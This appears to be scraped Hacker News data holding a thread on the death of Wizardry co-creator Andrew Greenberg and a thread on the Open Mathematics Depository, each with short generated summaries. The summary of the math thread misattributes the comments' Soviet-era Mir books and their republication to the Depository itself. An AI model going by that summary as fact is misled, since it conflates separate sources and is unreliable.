    "commentBody": "Wizardry Co-Creator Andrew Greenberg Has Passed Away (timeextension.com)137 points by homarp 14 hours agohidepastfavorite51 comments bhouston 5 hours agoSir Tech was pretty formative in my professional development. Back then game development wasn't quite as professionalized/industrialized as it is now. My first job in the industry, back in high school in the mid 1990s, was as a part-time developer at Sir Tech Canada, working on Wizardry. They had a 20-ish person studio in Ottawa working on Jagged Alliance and Wizardry about 15 minute drive from where I was. How I got in: In high school I saw an ad posted in the local newspaper. Even though I was 17 I applied and got the job as a 3D graphics developer. I had used my work in the demo scene as my resume. I then dropped half of my courses so I could work half days at Sir Tech on Wizardry while finishing high school. We were using Windows NT 4 machines with Voodoo 3DFX graphics cards as our development machines. The beta of 3DS Max for Windows as the content creation package, although there was an SGI machine with Softimage on it as well. I personally was using Visual Studio with Direct3D 3 doing various experiments on how to render the 3D realistically while being fast. It wasn't the most successful internship personally, I was pretty green, a bit disconnected from the main development drive and didn't really know how to work in that environment, but it was still fun. The demos I created worked, but my larger system architecture was lacking. Besides meeting the original Sir Tech guys at a Christmas party in the US, I did see Brenda Romero (then Brathwaite) on a regular basis in the office as she was working on the script. It is a shame we didn't take more pictures back in the 1990s. I don't have any pictures of my time there or with anyone. reply DowagerDave 1 hour agoparent>> It is a shame we didn't take more pictures back in the 1990s. I don't have any pictures of my time there or with anyone. I really appreciate your description and the picture it paints; it's a lot more work than taking a photograph. We take so many pics and videos these days that it can make the event or subject feel less valuable. reply djur 1 hour agoparentprevThat's a cool story. I kind of get the impression that Sir Tech in particular was always a little ramshackle, especially by that time. Wiz 8 was in production forever. Turned out cool, but a bit out of step with the time it was released. reply santoshalper 1 hour agorootparentYeah, in spite of releasing some very important and reasonably popular games, I think Sir-Tech always kept the soul (and structure) of a small business. reply MisterTea 1 hour agoparentprev> We were using Windows NT 4 machines with Voodoo 3DFX graphics cards as our development machines. I didn't realize the Voodoo was running on NT 4 but for CAD/3DS/etc I can see that being a thing. I remember trying to run Quake 2 on NT 4 (Dual P233 Tyan Tomcat IV w/128MB) but there was something that stopped me from doing so, think it was direct sound so no audio? Wasn't until Win 2k could I run games on an SMP machine. reply bhouston 1 hour agorootparent> I didn't realize the Voodoo was running on NT 4 but for CAD/3DS/etc I can see that being a thing. I may be incorrect about the Voodoo cards being in the NT 4 machines, if that was a driver impossibility. I think 3DS Max required Windows NT at the time? I know there was a bunch of Voodoo cards in the office as well, but maybe those machines ran Windows 95. reply radiowave 8 hours agoprevI remember him from the Squeak Smalltalk mailing list, probably early 2000s. He wrote a set of bindings for the pcre regular expression library, which I used quite a bit, but which was never picked up for inclusion in Squeak (because pcre \"isn't portable enough\"). And, with his intellectual property hat on, he was a regular source of advice to the Squeak community (none of it in an official capacity, he would hasten to add) as they worked through the process of relicensing from the original Squeak License to MIT. reply dredmorbius 7 hours agoparentI'd totally forgotten about his Squeak work. Yes, he was absolutely and infectiously enthusiastic about that. reply unkeptbarista 6 hours agoparentprevI had the pleasure of meeting (virtually) Andrew through his work with the Squeak community. I also ran into Robert Woodhead (also virtually) through the game StarWeb[1] which he played and contributed to[2]. [1] http://www.rickloomispbm.com/starweb.html [2] https://www.madoverlord.com/wiki/doku.php/madoverlord:projec... reply mikeInAlaska 1 hour agoprevMy friends and I played Wizardry on an Apple II with a green screen for so long that it would blast out the green receptors in our eyes for a while afterwards, and everything would be pink hued. reply dredmorbius 9 hours agoprevThere's a brief biography of Werdna, as Andrew was known, on Wikipedia:He was also among the hackers featured in Steven Levy's Hackers, and was a regular attendee of the Hackers Convention which has occurred annually since the book's publication in 1986. This year marks the 39th occurrence: His jump from programming to law (which he saw as a form of hacking) was also notable. During the 1990s he'd often be found correcting misapprehensions, and occasionally affirming understandings, of intellectual property law particularly as concerned Free Software licencing and patents. Edit: He was also a key developer, advocate, and enthusiast of the Squeak Smalltalk OOD language:RIP, Werdna. reply zer0tonin 8 hours agoprevVery sad, Wizardry is probably the most influent RPG ever made, alongside Ultima. reply flyinghamster 7 hours agoparentIt also had an antecedent; Wizardry was very much like a single-player version of Avatar, an early multiplayer dungeon game that ran on the University of Illinois PLATO system. The cube-like \"rooms,\" displays, and game mechanics were very similar. I don't recall the controls being the same, though, and Avatar was written in PLATO's native TUTOR language, while Wizardry was UCSD Pascal. reply danschuller 5 hours agorootparent> There was a game on the PLATO network (circa '79 or '80) called \"Oubliette\" that nearly caused me to flunk out of law school. [...] Wizardry was in many ways our attempt to see if we could write a single-player game as cool as the PLATO dungeon games and cram it into a tiny machine like the Apple II. https://games.slashdot.org/comments.pl?sid=23752&cid=2567054 Oubliette (https://howtomakeanrpg.com/r/l/g/oubliette.html) was a precursor to Avatar, so it goes a little further back than even that! reply djur 1 hour agorootparentThe CRPG Addict blog has done a great job reviewing the PLATO games from a seasoned player's perspective, and he touches on some of the inspiration for Wizardry. Oubliette: https://crpgaddict.blogspot.com/2013/10/game-12-oubliette-19... Avatar: https://crpgaddict.blogspot.com/2013/11/game-124-avatar-1979... reply JieJie 1 hour agoparentprevLoved Wizardry. Before Wizardry, there was Akalabeth. https://wikipedia.org/wiki/Akalabeth:_World_of_Doom reply kleiba 6 hours agoparentprevFinal Fantasy? reply peterevans 4 hours agorootparentThe original magic system from Final Fantasy 1 (you can only cast N spells per magic level, maximum of 9) is a copy of the system from Wizardry. The only difference you have to type the spell name to cast it in Wizardry, and you get a menu in Final Fantasy. reply djur 1 hour agorootparentThe FF1 spell list is more directly derived from D&D, though. It even has the Power Words. The sense I've gotten from reading about the development of FF is that the dev team had varied experience with existing RPGs, so the game ended up as a mixture of derivative and original ideas. (The face-to-face side view in combat was apparently inspired by football!) reply louhike 5 hours agorootparentprevDragon Quest (which came before Final Fantasy and inspired it) took inspiration from Wizardry. Most RPG from the 80s were inspired by Wizardry. It had huge influences. reply entropicdrifter 2 hours agorootparentJRPGs especially! Wizardry as a series remained popular in Japan well after its popularity faded in the west. You can see games taking the general first-person dungeon crawling style straight from Wizardry in some late-90s JRPGs like the King's Field series. I think the Wizardry series itself is still going in Japan, as well. reply aithrowaway1987 1 hour agorootparentEtrian Odyssey is a contemporary Japanese dungeon crawler series in the Wizardry / Might and Magic mould, so at least among a modest niche the genre is still going :) reply prepend 6 hours agorootparentprevFinal Fantasy is awesome but it’s 2-3 generations after wizardry and ultima. reply __MatrixMan__ 5 hours agorootparentprevD&D reply StanislavPetrov 7 minutes agoprevCan't begin to calculate how many hours I played Wizardy as a kid. I had snuck out of class and was playing Wizardy on the school's computer in the library when I saw the Challenger explode on lift off. RIP. reply agluszak 7 hours agoprevI'm too young to have played the older games, but Wizardry 8 is one of my favorite games ever, comparable to Morrowind in the fascinating lore, music and general fun. I wish there was an open source reimplementation like OpenMW[1]. Perhaps, one day, I'll start writing one myself... 1 - https://openmw.org/ reply djur 1 hour agoparentWiz8 runs pretty well still. The GOG version even still has the computer builder ad on exiting. I think they got their money's worth, because I got curious enough to go to the website in the ad and they're still in business! Who knows, they might still get the occasional sale from that 20+ year old ad buy. reply shagie 3 hours agoparentprevThere's a faithful (mechanics) remake of the original on Steam - Wizardry: Proving Grounds of the Mad Overlord . The original view is in the corner - https://shared.akamai.steamstatic.com/store_item_assets/stea... The price tag is a bit high, but the nostalgia was worth it (for me). reply rout39574 2 hours agorootparentOoo... Did it include the I-9 easter egg? reply shagie 1 hour agorootparentThere is no item number that way... so no. https://steamcommunity.com/app/2518960/discussions/0/7187237... reply wiz21c 9 hours agoprevWizardry was developped in Pascal (which at that time was not common at all IIRC)... reply sowbug 5 hours agoparentWizardry was prototyped in Applesoft BASIC using low-res graphics mode. In 1982 or 1983 I briefly had a copy on a 140KB floppy disk, but I foolishly erased it because I needed the space. I've found a couple other people who remember seeing the demo, but I don't know anyone who has it. reply homarp 4 hours agoprevon wizardry, https://www.filfre.net/2012/03/making-wizardry/ and https://www.filfre.net/2014/06/of-wizards-and-bards/ reply r721 8 hours agoprevPC Gamer story: https://www.pcgamer.com/games/rpg/andrew-greenberg-co-creato... reply glimshe 8 hours agoprevMy Wizardry anthology CD is one of my most valued gaming possessions. RIP. reply jmyeet 5 hours agoprevWizardry taught me something very important about game design (from a player's perspective). Wizardry 6-7 were great from a perspective of becoming overpowered if you wanted to. What you did was get to level 6-8 and then change classes. I forget the exact mechanics of this. But when you changed class you started weak so had to do 1 character at a time from your party of 5. I doubt it was designe dthis way. Anyway, it was fun. It made you feel like you were beating the game. It made content trivial but I've come to learn that a ton of players like that. It's like seeing a weakness in the system, an unintended consequence and exploiting it. Wizardry 8 basically removed this and honestly I got bored of it really quickly as a result. Another way to look at this is that normalizing this made everything feel the same. It robbed me, as a player, of agency. It made my choices basically meaningless. It turned a more open world into a conveyor belt. I've seen this pattern play out in many games. Like I returned to GTA:SA to have fun shooting down helicopters taking advantages of bugs in police pathing depending on how you stood on a roof or creating massive pile ups and explosion chains on the freeway. GTA5 basically took the \"fun\" and comerical nature out of this aspect of the game and I basically never touched it again after the campaign. More generally, you could probably classify this under the banner of emergent game play (not that \"god mode\" is particularly innovative). But emergent gameplay is both a sign of a well-designed game and what gives it longevity. Additionally, I miss the days where there were more turn-based games. They were just more chill. The only turn-based strategy game left is Civilization. Games like Elden Ring are great but just not my cup of tea. I miss the days of Bard's Tale, Master of Magic, Heroes of Might and Magic (2 and 3), the old D&D RPG games and so on. Anyway, RIP. reply distances 1 hour agoparentBaldur's Gate 3 has turn-based combat, like D&D should have. The game sure has been praised everywhere already, but as I play almost exclusively turn-based games, I can confirm that it checked all my boxes. Absolutely superb game. I never played the Wizardry series myself, but I can see that Might & Magic 7: For Blood and Honor with its turn based combat is the title that defined for me what an RPG should feel like. reply justinclift 5 hours agoparentprev> Like I returned to GTA:SA to have fun shooting down helicopters taking advantages of bugs in ... Did you ever play the early Saints Row series? ie 1-3 Those were pretty fun. The later ones turned to crap though. :( reply dialup_sounds 9 hours agoprevThree levels of nostalgia to choose from: https://store.steampowered.com/app/2518960/Wizardry_Proving_... https://www.wizardryarchives.com/downloadsw4.html https://archive.org/details/wizardry-proving-grounds-of-the-... RIP, Werdna reply jghn 6 hours agoparentSpeaking of nostalgia, I'm always on the lookout for a playable version of the Mac port. I've found a few of them over the years but never managed to get them to work. I don't even want to know how many hours I spent playing this in the mid-80s, and always liked the Mac port better than the PC one my friends had. The kicker is I do have the original box & floppy, so it's \"legal\". I am skeptical that the disk still works and it's been almost 20 years since I had a floppy drive at all much less attached to a computer that could read this disk. reply shagie 3 hours agorootparentThe Mac port was really well done. I had played it on the Apple ][+ and Mac version (and now the Steam updated version). The thing with the Mac port is that it wasn't just a port but a reimplementation that was designed for the Mac UI of the day. https://www.macintoshrepository.org/5149-wizardry-proving-gr... reply jghn 3 hours agorootparentHmm, I think this is one of the ones I've tried. Perhaps it was operator error, I'll have to give it another try. That version was soooo much better than other implementations I saw. If I had a windows machine instead the remake on Steam looks like it'd also be great to try but alas. reply shagie 12 minutes agorootparentI'd have to check... it might be playable on Steam Deck and/or streamable to a Mac. While I've got an acceptable windows gaming machine so the Mac gets less play now, I did have a period of time where I had the Steam Deck and streamed the odd game to my Mac where I played it. reply aidenn0 1 hour agorootparentprevIf you do try to revive the floppies, be aware that most USB floppy drives can't read 400k and 800k Mac disks, so check a mac specific forum before buying one. reply jghn 40 minutes agorootparentoh for sure it wouldn't have ever occurred to me that it could possibly work reply smrtinsert 3 hours agoparentprevThe Wizardry box was absolutely epic. I can feel its texture through that jpg. reply ainiriand 10 hours agoprev [6 more] [flagged] dredmorbius 9 hours agoparent [–] Wrong thread? reply kinlan 9 hours agorootparentIt's there as soon as you load the page. I get it, this cookie prompt hides the important article and there's a heap of information share. reply dredmorbius 9 hours agorootparentIn which case, the \"tangential annoyances\" principle applies:If available, uBlock Origin, uMatrix, or other JS / cookie blockers will help, as will incognito mode (against persistent trackers). Firefox/Android provides for these. I'm not sure what the current state of iOS browsers is, though there is a Firefox/iOS these days. Desktop systems afford far more options, of course. But the discussion is off-topic. reply ainiriand 2 hours agorootparentIt is more than a tangential annoyance in my opinion. It blocks the article until you hide it. I'm very much in favor of ad space in free publications but this looks like milking the visitors. reply dialup_sounds 9 hours agorootparentprev [–] It's from the cookie banner of the linked site. Off topic but still, wow. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Andrew Greenberg, co-creator of the influential RPG Wizardry, has passed away, leaving a significant legacy in the gaming industry.",
      "Wizardry, released in 1981, was one of the first RPGs for personal computers and had a notable impact, particularly in Japan; it was recently remastered by Digital Eclipse.",
      "Greenberg's career also included work as a patent attorney and in renewable energy, and he is fondly remembered by the gaming community."
    ],
    "commentSummary": [
      "Andrew Greenberg, co-creator of the influential game Wizardry, has passed away, leaving a significant legacy in the game development industry.",
      "Discussions highlight the impact of Wizardry on the RPG genre, influencing major titles like Final Fantasy and Dragon Quest.",
      "Users shared nostalgic memories of working with early gaming technology, such as Windows NT 4 and Voodoo 3DFX graphics cards, during the 1990s at Sir Tech Canada."
    ],
    "points": 137,
    "commentCount": 51,
    "retryCount": 0,
    "time": 1725336676
  },
  {
    "id": 41429515,
    "title": "Open Mathematics Depository",
    "originLink": "https://openmathdep.tuxfamily.org/",
    "originBody": "Open Mathematics Depository Depository The primary intention of this project is to provide open access to mathematical texts in PDF format which individual mathematicians find particularly useful and which are clearly in the public domain or under open license. This provides a middle ground between large depositories like archive.org which host \"everything\" and subscription download services which often monopolize access to public domain texts. Please notify us, using the email below, if any of our PDF files are corrupted so that we can re-upload the readable file. The PDFs of our mathematical texts are here. Share your mathematics PDFs Contributions of texts in PDF form, which are in the public domain or under open license, may be sent to our email below. Please only send texts that you personally find useful and helpful. If you have created interesting bookmarks or notes, feel free to leave them in. The purpose of this project is to be a selective depository, housing texts which people who practice mathematics find worthwhile. Until there are curators for other languages, please send only English texts. Anyone wishing to be the curator for another language is welcome to email us at the address below. The following donations would be greatly appreciated: Klein's Elementary Mathematics from an Advanced Standpoint - Geometry Hilbert's Geometry and Imagination Any solid exposition of Grassmann Algebra/Spaces Are we violating your copyright? If your property is on archive.org, have them remove it and we will happily follow suit. Most of our pdfs come from there. Otherwise, just follow these four steps and we'll pull the file. Email us using the Project Email below. We will respond with our physical address. Send us a trackable letter establishing your claim. On receipt, we will delete the file and notify you by email. Contact info is here",
    "commentLink": "https://news.ycombinator.com/item?id=41429515",
    "commentBody": "Open Mathematics Depository (tuxfamily.org)132 points by aragonite 19 hours agohidepastfavorite12 comments rramadass 13 hours agoSoviet era Mathematics (and other sciences) books here : https://mirtitles.org/ These are concise but quite dense and pretty good. Students are well advised to go through these in addition to their prescribed textbooks. reply mkl 8 hours agoparentEasier to access here: https://archive.org/details/mir-titles reply maxk42 13 hours agoparentprevMir is amazing for math books and sadly underappreciated in the US. reply rramadass 8 hours agorootparentYep, Teachers and other knowledgeable folks should point students to them. Many of these are being republished by Indian publishers on Amazon India. Another good (and affordable) source of Mathematics/Science books are the ones from Dover Publications. reply albert_e 12 hours agoprevAppreciate small efforts like these A simple search and bibiography might add a lot of value here One of us who is enthusiastic enough might implement a \"ask this book\" chatbot on top of this repo, maybe? Hopefully that doesnt violate any copyrights either reply maxk42 18 hours agoprevI wonder if someone could crawl this and provide an archive? I'd love to get the whole set and I'm sure there are others who would also. reply nequo 18 hours agoparentYou could probably build a mirror with `wget -r` without writing a crawler. reply LNSY 15 hours agorootparentnohup wget -r -np https://downloads.tuxfamily.org/openmathdep/ seems to be working pretty well for me reply maxk42 13 hours agorootparentBrilliant! This is exactly what I was hoping for: Thank you! reply careless_lisper 12 hours agoprevRelated, website I came across the other day with free resources on many math topics: https://realnotcomplex.com/ Includes books, lecture notes and videos. reply lanstin 14 hours agoprevThere isn't that much stuff there. If you have any specific interest you can find it in about 30 seconds. They have several Bourbaki volumes which I haven't been able to get for free and legal before which I enjoyed reading. reply rossant 12 hours agoprev [–] Shameless plug. See also https://github.com/rossant/awesome-math reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The Open Mathematics Depository aims to provide open access to mathematical texts in PDF format that are either in the public domain or under an open license.",
      "This project serves as an intermediary between large repositories like archive.org and subscription services, ensuring free access to valuable mathematical resources.",
      "Contributions of public domain or open license mathematics PDFs are welcomed, with a current focus on English texts until curators for other languages are available."
    ],
    "commentSummary": [
      "The Open Mathematics Depository on TuxFamily.org is being highlighted for its collection of Soviet-era mathematics books, which are known for their concise and dense content.",
      "Users are discussing easier access to these resources through platforms like Archive.org and recommending their use alongside standard textbooks.",
      "There is a call for teachers to recommend these books, noting that many are republished on Amazon India and by Dover Publications, making them more accessible and affordable."
    ],
    "points": 132,
    "commentCount": 12,
    "retryCount": 0,
    "time": 1725318409
  }
]
